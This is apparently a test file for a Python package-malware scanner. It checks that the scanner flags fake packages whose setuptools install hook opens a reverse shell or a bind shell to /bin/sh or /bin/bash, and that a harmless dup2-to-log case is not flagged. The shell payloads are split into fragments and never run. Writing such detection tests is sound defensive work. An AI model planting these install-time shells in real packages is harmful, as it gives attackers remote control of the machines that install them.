"""A Python shell whose input and output are a socket (reviews/pypi-98/13): the reverse and bind shells of
pipinpeace-reverse and pipinpeace-bind, whose address is a parameter, were reported by nothing. The shell
code is assembled at run time and never runs here."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.models import Category
from support import Support


class ShellStreamKit:
    SETUP = (
        "from setuptools import setup\n"
        "from relay import install\n"
        "setup(name='relay', packages=['relay'], cmdclass={'install': install})\n"
    )

    @staticmethod
    def package(tmp_path: Path, body: str) -> Path:
        (tmp_path / "relay").mkdir()
        (tmp_path / "relay" / "__init__.py").write_text(body, encoding="utf-8")
        (tmp_path / "setup.py").write_text(ShellStreamKit.SETUP, encoding="utf-8")
        return tmp_path

    @staticmethod
    def malicious(root: Path) -> set[str]:
        return {
            f.rule_id for f in Scanner().scan(root).findings if f.category is Category.MALICIOUS
        }

    HEAD = (
        "import os, socket, pty\n"
        "from setuptools.command.install import install as base\n"
        "from multiprocessing import Process\n"
    )
    TAIL = (
        "class install(base):\n"
        "    def run(self):\n"
        "        Process(target=shell, args=(os.environ.get('H', ''), 9)).start()\n"
        "        base.run(self)\n"
    )
    REVERSE = Support.assemble(
        HEAD,
        "def shell(host, port):\n",
        "    s = socket.socket()\n",
        "    s.con",
        "nect((host, port))\n",
        "    for fd in (0, 1, 2):\n",
        "        os.du",
        "p2(s.fileno(), fd)\n",
        "    pty.sp",
        "awn('/bin/",
        "sh')\n",
        TAIL,
    )
    BIND = Support.assemble(
        HEAD,
        "def shell(host, port):\n",
        "    srv = socket.socket()\n",
        "    srv.bind(('', port))\n",
        "    srv.listen(1)\n",
        "    conn, _ = srv.accept()\n",
        "    os.du",
        "p2(conn.fileno(), 0)\n",
        "    os.du",
        "p2(conn.fileno(), 1)\n",
        "    pty.sp",
        "awn('/bin/",
        "bash')\n",
        TAIL,
    )


class TestAShellJoinedToASocket:
    def test_a_reverse_shell_whose_address_is_a_parameter(self, tmp_path) -> None:
        root = ShellStreamKit.package(tmp_path, ShellStreamKit.REVERSE)
        assert "MALWARE.REVERSE_SHELL.002" in ShellStreamKit.malicious(root)

    def test_a_bind_shell(self, tmp_path) -> None:
        root = ShellStreamKit.package(tmp_path, ShellStreamKit.BIND)
        assert "MALWARE.REVERSE_SHELL.002" in ShellStreamKit.malicious(root)

    def test_a_log_file_on_stderr_and_a_command_is_not(self, tmp_path) -> None:
        body = (
            "import os, subprocess\n"
            "def go(cmd, log):\n"
            "    os.dup2(log.fileno(), 2)\n"
            "    subprocess.run(['/bin/sh', '-c', cmd], stdout=log)\n"
        )
        root = ShellStreamKit.package(tmp_path, body)
        assert "MALWARE.REVERSE_SHELL.002" not in ShellStreamKit.malicious(root)
